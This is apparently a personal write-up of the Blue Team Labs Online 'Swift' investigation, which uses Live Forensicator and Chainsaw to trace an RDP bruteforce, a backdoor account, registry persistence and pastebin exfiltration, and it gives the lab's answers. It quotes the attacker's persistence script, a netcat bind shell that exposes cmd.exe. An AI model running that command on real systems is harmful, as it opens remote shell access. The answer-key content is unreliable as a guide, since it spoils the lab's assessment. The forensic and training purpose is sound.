# [Blue Team Labs Online - Swift](https://blueteamlabs.online/home/investigation/swift-17217744e9) 
Created: 15/05/2024 11:10
Last Updated: 02/06/2024 17:43
* * *
<div align=center>

![5644a81119da2be5a1f1858c9a438c66.png](../../../_resources/5644a81119da2be5a1f1858c9a438c66.png)
</div>

>Use Live Forensicator, a PowerShell framework, to collect key artifacts for analysis and triage after a Windows system has been compromised. Investigate the retrieved data and find clues of what happened.

>**Tags**: Live Forensicator, PowerShell, Notepad++, Chainsaw, T1110, T1136, T1086, T1547.001, T1567.002,
* * *

**Scenario**
**The login credentials are shown on the lab client.**

Use Live Forensicator, a PowerShell framework, to collect key artifacts for analysis and triage after a Windows system has been compromised. Investigate the retrieved data and find clues of what happened.

**When using Live Forensicator and Chainsaw, make sure to run them using an administrative-level command prompt or PowerShell session.**

**Reading Material:**
https://github.com/Johnng007/Live-Forensicator
https://github.com/WithSecureLabs/chainsaw
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11)
* * *
## Investigation Submission
> Run Live Forensicator using the "-EVTX EVTX" flag. Open the created output .HTML files in Chrome. According to Live Forensicator, which user accounts were locked out? (Alphabetical order)

Live Forensicator is a tool written in PowerShell to gathering artifacts of infected system and find anomaly or suspicious activity that happened on that system

![21c50034f719558af9fdf8dc6819e291.png](../../../_resources/21c50034f719558af9fdf8dc6819e291.png)
We can start by using `.\Forensicator.ps1 -EVTX EVTX` to collect event log 
![f79f8b6fa9917dfb8bbc9d1dc025718e.png](../../../_resources/f79f8b6fa9917dfb8bbc9d1dc025718e.png)
Then Go to Live Forensicator folder and you will find a folder named after hostname of this system, Go to that folder and Open `index.html` 
![6526d73003ca5985e614f09fa87e7691.png](../../../_resources/6526d73003ca5985e614f09fa87e7691.png)
Web browser should be opened now and next we will click "Event Log Analysis" and show "User LockOut Activities"

As you can see, there are 4 users
```
Administrator, Brittany.Song, John.Raymond, ServiceAccount
```

>Review the Lockout Policy on the machine. What is the number of failed logons before an account is locked, and what is the lockout duration?

You can learn more about Account Lockout Policy from Microsoft Learn [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/account-lockout-policy)
![1f047a3f29bfee2d367330f9599049b2.png](../../../_resources/1f047a3f29bfee2d367330f9599049b2.png)
We will need to open Group Policy Editor then go to this specific path
![59c26198afb06789ed78d214b8ed8158.png](../../../_resources/59c26198afb06789ed78d214b8ed8158.png)
Search for Group Policy then open it
![206b987b01e60ade6efe7b80f7043c19.png](../../../_resources/206b987b01e60ade6efe7b80f7043c19.png)
You can see that Account lockout threshold is set to 10 invalid logon attempts and It will be unlocked after 10 minutes
```
10, 10
```

>Which accounts were successfully accessed during the bruteforce attack?

![ee8a1a5441e52f32128634c9725c4499.png](../../../_resources/ee8a1a5441e52f32128634c9725c4499.png)
Go back to our Web Browser (Still on Event Log Analysis) then show "RDP Login Activities" to review which account was successfully logged on from remote user. then you will see 3 accounts that was logged on from the same IP address but the answer are Claire and ServiceAccount
```
Claire.Daniels, ServiceAccount
```

>What is the IP address that conducted the bruteforce attack and accessed these accounts, and what country is it associated with?

![19d26567d12fa9de0dfaa0f61330de56.png](../../../_resources/19d26567d12fa9de0dfaa0f61330de56.png)
Grab this IP and go to Ip-location.com
![b61b13aab4ab797dab79ab5537d37064.png](../../../_resources/b61b13aab4ab797dab79ab5537d37064.png)
It associates with UK
```
82.2.66.222, United Kingdom
```

>What account is created by the attacker, what is the Time associated with this activity according to Live Forensicator?

![a23e16d630211f0410c6095014e71f89.png](../../../_resources/a23e16d630211f0410c6095014e71f89.png)
Still on "Event Log Analysis", this time click to show "User Creation Activity"

Now we can figure it out why only 2 users were successfully bruteforced since this account was created later
```
ServiceAccountBackup, 8/26/2022 3:13:02 PM
```

>Use Chainsaw with the -r flag and point the tool at the Live Forensics EVT output folder to further investigate the RDP bruteforce activity. How many failed logins are detected across all affected accounts? 

Chainsaw is a powerful tool when it comes to analyze event log so lets use `.\chainsaw.exe hunt -r .\rules\ C:\Users\BTLOTest\Desktop\Live-Forensicator-main\EC2AMAZ-UUEMPAU\EVT` to let it process (I used `.\rules` because I didn't one to roll just 1 specific rule)
![19f9451f0e7f15b8d2c8a7d4af849011.png](../../../_resources/19f9451f0e7f15b8d2c8a7d4af849011.png)
After its done processing, scroll down to "Login Attacks".
Now we will sum all of these failed login attempts for an answer (13+44+10+10=77)
```
77
```

>What local accounts were NOT targeted in this attack, according to Chainsaw's output for Login Attacks? (Only include accounts that are likely used by humans! and no, don't include BTLO!)

![7819d1afeeabb4ad4135942c2f664a14.png](../../../_resources/7819d1afeeabb4ad4135942c2f664a14.png)
Back to Web Browser, we will go to "Users & Accounts" to compared both result and you can see that only 2 users are not listed on "Login Attacks" result
```
Claire Daniels, George Darville
```

>Using Live Forensicator, identify the script that the attacker attempted to use for persistence. Submit the filepath and filename (Hint: Think about the account that is actively being used by the attacker to identify the right file!)

![687ec00caf45078ad3542ec3eac7d33b.png](../../../_resources/687ec00caf45078ad3542ec3eac7d33b.png)
Go to "System Processes", there are sevaral persistence techniques here but I clicked to show "Startup Programs" first then found this suspicious script file that added by compromised account
```
C:\Windows\Temp\script.ps1
```

>What are the contents of the script file?

![8ea31a328ec9353fe65be1de1e758d68.png](../../../_resources/8ea31a328ec9353fe65be1de1e758d68.png)
Go to Temp folder to read the content of this file (or you can just get content from PowerShell directly)
![7523b14a9e54d85a06e62676f3abdb9f.png](../../../_resources/7523b14a9e54d85a06e62676f3abdb9f.png)
```
cmd.exe -c nc64.exe -lvp 4456 -e c:\Windows\System32\cmd.exe
```

>We can't always trust the output from our tools. Manually investigate the machine's Run, RunOnce, RunServiceOnce registry keys. List the keynames where the persistence script is being executed 

![f4c884df32935d4f441fc6d09cc74c4d.png](../../../_resources/f4c884df32935d4f441fc6d09cc74c4d.png)
For reference, we will check these 3 keys
Using 
```
Get-Item HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
Get-Item HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
Get-Item HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
```
![7816c62dbe754756889b8509a346c1c9.png](../../../_resources/7816c62dbe754756889b8509a346c1c9.png)
There are 2 keys that store this malicious script which is different from Live Forensicator result
```
Run, RunserviceOnce
```

>Run Live Forensicator again using the flag to get browser history. Look at the BROWSING_HISTORY directory first, focusing on history from the compromised account used by the attacker. Three websites are a concern for data exfiltration, what are the URLs? (Alphabetical order based on subdomain or domain)

![63958a260b5f0d27f39681c9b1c566fd.png](../../../_resources/63958a260b5f0d27f39681c9b1c566fd.png)
Lets use `.\Forensicator.ps1 -BROWSER BROWSER` to gather browser artifacts and process them
![599c6b3fff223272228486dbf34b2989.png](../../../_resources/599c6b3fff223272228486dbf34b2989.png)
Inside hostname folder under Live Forensicator folder, there is a new folder named "BROWSING_HISTORY" which will have log files of all user's browser history

Open history file from ServiceAccount since we know this is a compromised account
```
https://gds.google.com, https://pastebin.com, https://wetransfer.com
```

>Look at Live Forensicator's BrowserHistory.html output and search through the results for Pastebin. What is the URL that contains exfiltrated company data? 

![e87b8b0917d6b1708f3a772452328418.png](../../../_resources/e87b8b0917d6b1708f3a772452328418.png)
Back from BROWSING_HISTORY, go up then open "BrowserHistory.html"
![20c348b663aa6cf620cc2ecf8ba4c87b.png](../../../_resources/20c348b663aa6cf620cc2ecf8ba4c87b.png)
Search for pastebin and you can see that we didn't need to go to that url ourselves (for now), Title has enough info for us
![a9dc5ed052d2506e69ed9b5f15db9d5d.png](../../../_resources/a9dc5ed052d2506e69ed9b5f15db9d5d.png)
There it is
```
https://pastebin.com/MbnNWkMT
```

>Visit this page directly (or if it is removed, use web.archive.org). How many rows of data have been exfiltrated by the attacker?

![0ee494b9c6f94eb91b145ce08ecdf1a4.png](../../../_resources/0ee494b9c6f94eb91b145ce08ecdf1a4.png)
```
50
```

>Revisiting the malicious script created by the attacker, according to Live Forensicator, what is the creation date for the .ps1 file? 

![05db9b44424f21e228acc62dc3ffeee6.png](../../../_resources/05db9b44424f21e228acc62dc3ffeee6.png)
After searching for "script.ps1", we got 4 records of it and the oldest one is this record which is the correct answer of this question
```
8/26/2022 15:34:27 PM
```

>What is the Last logon value for the attacker manually accessing the compromised account? (Remember, certain persistence mechanisms might log in as the user, so think about the timestamp that makes sense within the timeline)

![7149cab0c623efc5362214ced1a961b7.png](../../../_resources/7149cab0c623efc5362214ced1a961b7.png)
Go to Security Event log, filter for EventID 4624 (Successfully Logon) and narrow down to date and time that close to previous question which is this one
```
8/26/2022 15:40:22 PM
```

>Based on the information in the data dump, investigate the files of each user on the system to locate the document. What is the filename, and which account was it stored on?

![b204b110af8825cff9d4c13268bcfb4c.png](../../../_resources/b204b110af8825cff9d4c13268bcfb4c.png)
After searching through every user's Desktop/Download/Document folder I finally found it in `C:\Users\George.Darvill\Desktop\HR Documents\Employee Details - CONFIDENTIAL`
```
Employee Master List.xlsx, George.Darvill
```

![608b53ff9b60aaab52b2e6ff367dc683.png](../../../_resources/608b53ff9b60aaab52b2e6ff367dc683.png)
* * *